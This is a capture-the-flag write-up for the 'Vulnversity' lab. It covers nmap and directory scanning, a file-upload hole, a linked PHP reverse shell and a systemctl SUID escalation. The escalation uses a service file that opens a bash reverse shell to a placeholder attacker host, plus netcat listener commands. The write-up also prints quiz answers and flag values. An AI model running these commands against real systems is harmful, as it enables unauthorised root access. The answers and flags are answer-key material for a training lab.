# Vulnversity

## task 2 
 Q. Scan the box; how many ports are open?
 A. 6

 Q. What version of the squid proxy is running on the machine?
 A. 4.10

 Q. How many ports will Nmap scan if the flag -p-400 was used?
 A. 400

 Q. What is the most likely operating system this machine is running?
 A. Ubuntu

 Q. What port is the web server running on?
 A. 3333

 Q. What is the flag for enabling verbose mode using Nmap?
 A. -v


$ nmap -sV 10.201.30.38                

	PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         vsftpd 3.0.5
	22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
	139/tcp  open  netbios-ssn Samba smbd 4
	445/tcp  open  netbios-ssn Samba smbd 4
	3128/tcp open  squid-http?
	3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

found hidden directories:
images                  [Status: 200, Size: 7206, Words: 356, Lines: 48, Duration: 270ms]
css                     [Status: 200, Size: 4090, Words: 208, Lines: 32, Duration: 242ms]
js                      [Status: 200, Size: 4638, Words: 278, Lines: 34, Duration: 249ms]
fonts                   [Status: 200, Size: 1538, Words: 100, Lines: 20, Duration: 272ms]
internal                [Status: 200, Size: 525, Words: 62, Lines: 27, Duration: 280ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 320ms]

/internal/ has file uploading vulnerability.

get reverse shell from :
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


all php exetentions: 
.php
.php3
.php4
.php5
.phtml


found the user flag: 
/home/bill/user.txt:
8bd7992fbe8a6ad22a63361004cfcedb


in systemctl suid bit was set.
so what is done is 

SUID bit on /bin/systemctl is very very vulnerable.
-
cat << EOF > /tmp/rootme.service
[Unit]
Description=root me brooo

[Service]
type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/hacker-ip/hacker-port 0>&1'

[Install]
Wantedby=multi-user.target


before linking and starting the service open the port on listening mode on local machine
$ nc -lnvp hacker-port

on remote machine start the service:
$ /bin/systemctl link /tmp/rootme.service
$ /bin/systemctl start rootme.service


wallah connected to server as root!!!!!

got the flag:
cat /root/root.txt
a58ff8579f0a9270368d33a9966c7fd5

